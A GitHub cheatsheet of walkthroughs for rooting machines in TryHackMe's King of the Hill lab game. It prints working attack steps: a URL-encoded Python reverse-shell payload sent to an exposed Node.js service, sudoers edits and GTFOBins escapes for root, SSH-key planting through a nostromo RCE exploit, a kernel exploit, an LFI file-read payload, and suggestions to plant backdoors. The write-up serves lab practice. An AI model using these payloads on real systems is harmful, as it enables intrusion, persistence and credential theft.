# This is a work in progress, Many more machine cheatsheets will be updated very soon.
### Active Contributors : 
Sorry I am lazy AF, will update more machines soon!
 
#### I am not posting the methods that are 'technically' better, I am posting methods that will be easiest to do and will get you win. Target is to win while being inside the rules. This is not an exam, there are no wrong answers. As the saying goes, If it works, don't touch it.
This a github cheatsheet of owning the machines in King of the Hill game of TryHackMe.

## Index of Machine Covered:
1. [Food](#machine-name-food)
2. [Shrek](#machine-name-shrek)
3. [SpaceJam](#machine-name-space-jam)
4. [Fortune](#machine-name-fortune)
5. [Production](#machine-name-production)
6. [Lion](#machine-name-lion)
7. [Hackers](https://github.com/holmes-py/King-of-the-hill/blob/master/Writeup%20for%20Hackers%2001.md)

# Machine name: FOOD
NMAP scan with `-p-` revealed that there is a telnet running on port 46969. <br /> 

So following are the steps to get root, ASAP. <br /> 

1. Connect on the port: <br /> 
    `telnet <IP> 46969` <br /> 
2. The Username and password are in caesor cipher. <br /> 
    Username: food <br /> 
    Password: givemecookies <br /> 
3. After scanning the machine with linPEAS.sh, We found that `vim.basic` binary is vuln to read and write to privilaged files.
    `vim.basic /etc/sudoers` <br /> 
    Press i <br /> 
    Add this line after the line with `root` is the start. <br /> 
    `food ALL=(ALL:ALL) ALL` <br /> 
    Press Ctrl+[ <br /> 
    Press :w! Enter <br /> 
    Press :q! Enter <br /> 
    `sudo su` <br /> 
    In prompt enter the password of food, i.e.  `givemecookies` <br /> 
   #### YOU ARE ROOT. NOW DEFEND YOUR TITILE.
    


#  Machine name: SHREK

    
This is first and relatively easy machine, But beaware this things have too many entries to keep an eye on, Best Idea for defending this is by just killing the shells. Again I am not posting the methods that are 'technically' better, I am posting methods that will be easiest to do and will get you win.
Target is to win while being inside the rules. This is not an exam, there are no wrong answers.
As the saying goes, *If it works, don't touch it.* 

1. Initial gobuster scan revealed that `robots.txt` file contains an abnormal entry, When we navigate to it, we find the entire RSA key.

![image](https://user-images.githubusercontent.com/54495695/81495768-495e6f80-92d0-11ea-8ab8-daab1abe3cf3.png)

2. Copy the key, paste it in a file, give the file necessary permissions.<br />
Assuming you made the RSA key file with the name `id_rsa`, follow these commands.<br />
`chmod 600 id_rsa`<br />
`ssh -i id_rsa shrek@<IP ADDRESS OF MACHINE>`<br />
This will give you a shell to shrek.<br />

3. After scanning the machine with linPEAS.sh, We found tha there is a gdb vulnerabilty in the box, using GTFObins, We use the following commands to do Privilage escalation.<br />
`gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit`<br />
  #### YOU ARE ROOT. NOW DEFEND YOUR TITILE.<br />
    
#  Machine name: SPACE JAM

This machine is race to root kind of thing, There is a very low hanging fruit to get root, But it is a way use only entry, i.e. Whoever uses it first will try his best to destory this entry as it is too open. <br />

1. As always we do the basic nmap scan.<br />
![image](https://user-images.githubusercontent.com/54495695/81496158-2a151180-92d3-11ea-9d72-110073c4fbac.png)

2. We can see port 3000 is hosting Nodejs openly, So we try to get the reverse shell from it.<br />
    To do that, First start a listener on your machine using these commands:<br />
       `ncat -lvnp 4444` // I am using ncat, since I am on a Arch based system, You can use `nc` inplace of ncat.<br />
     Once the listener is ready, we deploy the payload.<br />
3. After testing many payloads we found the one of python to be working, For more payloads, follow this link.<br />
    The payload:<br />
           REPLACE <REMOTE_IP> with the IP of box.<br />
           REPLACE <LOCAL_IP> with the IP of your tryhackme VPN.<br />
   
        curl "<REMOTE_IP>:3000/?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22<LOCAL_IP>%22%2C4444%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27"

    On listener, you can see that we have a shell now.<br />
   
 4. After trying a lot of tests and linPEAS, I found that the easiest method to get king AND root shell is to exploit the `cp` vulnerability on the box. I am leaving the ideas to you for this one, but after making you king.<br />
 
    `LFILE=/root/king.txt`<br />
    `echo "<YOUR USERNAME>" | cp /dev/stdin "$LFILE"`<br />
#### YOU ARE KING. NOW DEFEND YOUR TITILE.<br />
Free Tip: (You know you can read anyfile with this vuln, use your imagination.)<br />
    `LFILE=file_to_read`<br />
    `cp "$LFILE" /dev/stdout`<br />

#  Machine name: FORTUNE

Now this is new machine, Released very recently, <br /> 
And made it hard for me to post direct commands, Why?<br /> 
Heres why, In this machine, there's a thing called autogen script, that regenrates everything at every reset. That means direct credentials doesn't work anymore. So you have to follow the instructions and do everything manually.<br /> 
Let's Hack:<br /> 


1. Initial nmap scans revealed that theres a netcat port open at 3333. <br /> 
    ![image](https://user-images.githubusercontent.com/54495695/81497074-b9252800-92d9-11ea-9e85-e727773fc41c.png)
##### UPDATE, you can skip next 2 steps and directly use the command in Shortcut Note.
2. When we connect to it, It gives out a weird base64 hash, After fiddling around, I found that it is base data of a zip file, so we use this [Site](https://base64.guru/converter/decode/file).<br /> 
    Copy the base64 hash to this site, and it will generate a file named application.zip.<br /> 
    
3. Now when we try to open the file, The file needs a password, Just crack this file using fcrackzip and wordlist rockyou.txt.<br /> 
    `fcrackzip -v -u -D -p ~/wordlists/rockyou.txt application.zip`<br /> 
   Once you have the password, unzip it.<br /> 
   `unzip application.zip`<br /> 
  ##### Shortcut Note:  MAKE SURE TO DO THE FOLLOWING EDITS: 
  $IP = IP of KoTH box  <br />
  $location = address of your rockyou wordlist <br />
  Copy the hash in a file, <br />
  
  `cat file.txt | base64 -d  > test.zip; unzip -P  (fcrackzip -v -u -D -p $location/rockyou.txt test.zip | grep "pw" |awk '{print $5}') test.zip; cat creds.txt`
  
   You get a file named creds.txt, Inside it we have the login details of user named `fortuna`. Lets GO.<br /> 
4. Using the creds, <br /> 
    `ssh fortuna@<BOX IP>`<br /> 
5. Now that we have the shell, We can work on Privilage escalation.<br /> 
    After linpeas and basic test, I found that:<br /> 
        5.1 We as fortuna are in sudoers list.<br /> 
        5.2 And we also have `pico` in the `sudo -l` list.<br /> 
        
6. We can simply edit the `/etc/sudoers/` file to give us ALL permissions to run sudo.<br /> 
7. Using this command:<br /> 
    `sudo pico /etc/sudoers`<br /> 
   Replace `pico` in sudoers file with `ALL`.<br /> 
8. Now you can just do, `sudo su` and you are root.<br /> 

#### You are ROOT, now defend your title.
   

# Machine name: PRODUCTION

 This machine is one of the easist ones.<br /> 
 ![image](https://user-images.githubusercontent.com/54495695/82766838-ff34cc80-9e3f-11ea-88e9-bfe5ed4e48c6.png)
 1. Basic enumeration will get you the password/ssh id_rsa key of user Ashu.<br /> 
 2. Once you are in machine with user as Ashu.<br /> 
    Check the `sudo -l`, you will see that you can run `su` on for user skiddy without password.<br /> 
 3. After, `sudo su skiddy` , You are in the skiddy shell.<br /> 
 4. We don't need to enumerate this machine anymore. The `sudo -l` can show that we can run `git` as sudo.<br /> 
 5. Using GTFObins, we see that the following commands can be used to give us root shell.<br /> 
    `sudo git -p help config`<br /> 
    `!/bin/sh`<br /> 
  Now, `id`, Voila, You are root.<br /> 
  
  P.S. Food for thought, there are two interesting ports open on machine, see if you can setup backdoors for you ;)

#### You are ROOT, now defend your title.<br /> 

# Machine name: Lion

1. After nmap scan we can see that weirdly there is no ssh on the machine. But nostromo is present at port 8080.<br />
  Later after doing complete scan we found that the port for ssh is shifted to port 1337.<br />
  ![image](https://user-images.githubusercontent.com/54495695/83907009-3bdabf00-a782-11ea-9334-867710bc27f4.png)
2. Searching for this vuln, we found that this specific version is vulnerable to CVE-2019-16278.
![nostromo](https://user-images.githubusercontent.com/54495695/83906759-cb33a280-a781-11ea-9258-83f6bf2e8deb.png)

3. Simply downloading the exploit from exploitdb, we can get RCE on machine.
    Note this CVE is python2 based.<br />
    `python2 cve2019-16278.py <KOTH MACHINE IP> 8080 "whoami"`<br />
    ![whoami](https://user-images.githubusercontent.com/54495695/83906864-f7e7ba00-a781-11ea-8998-2722287af76f.png)

  Online there are methods to use this CVE to get a reverse shell. But For some weird reason I was not able to get a rev shell from this. So here's my workaround.<br />
  First we generate sshkey in our machine, then we add the authorized_keys to the machine, as we have RCE.<br />
4. Generating sshkeys:<br />
  `ssh-keygen`<br />
5. Getting the authorized_keys:<br />We need the \*.pub file's data for this, It would look like this:<br />
![auth_key](https://user-images.githubusercontent.com/54495695/83906829-e8687100-a781-11ea-83f8-da94d38deb16.png)
<br />
6. Now use this command:<br />
    `python2 cve2019-16278.py <KOTH IP> 8080 "mkdir /home/gloria/.ssh; echo '<YOUR *.pub file data>' > /home/gloria/.ssh/authorized_keys"`<br />
7. Now we can simply ssh into the machine with our sshkey.<br />
    `ssh -i sshkey gloria@<KOTH BOX IP> -p 1337` <br />
8. And since we are in authorized_keys, we will be logged in without  password.<br />
9. Since we have a shell, Priv Esc is the next step. After some LinPEAS and LinEnum, I found that this box's kernel is vulnerable to cve-2017-16995.<br />
10. So we download the exploit from exploitdb and Here's a little trick to save compiling time on remote machine.<br />
Instead of uploading and compiling the exploit on remote machine, we can use `--static` in gcc to make a binary that's useable everywhere.<br />
    `gcc --static cve-2017-16995.c -o cve-2017-16995 && chmod +x cve-2017-16995 `<br />
11. Now just upload the binary to the remote box, and run it to get root.
<br />
#### Now you are root, Defend your title.<br />
P.S. If you are locked out and forgot to make a backdoor, here's food for thought:<br />
There's LFI on this address.<br />
`http://lion.thm:5555/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd`<br />
where, lion.thm is the IP of machine in hosts file. ;) (Maybe you can get id_rsa)

 
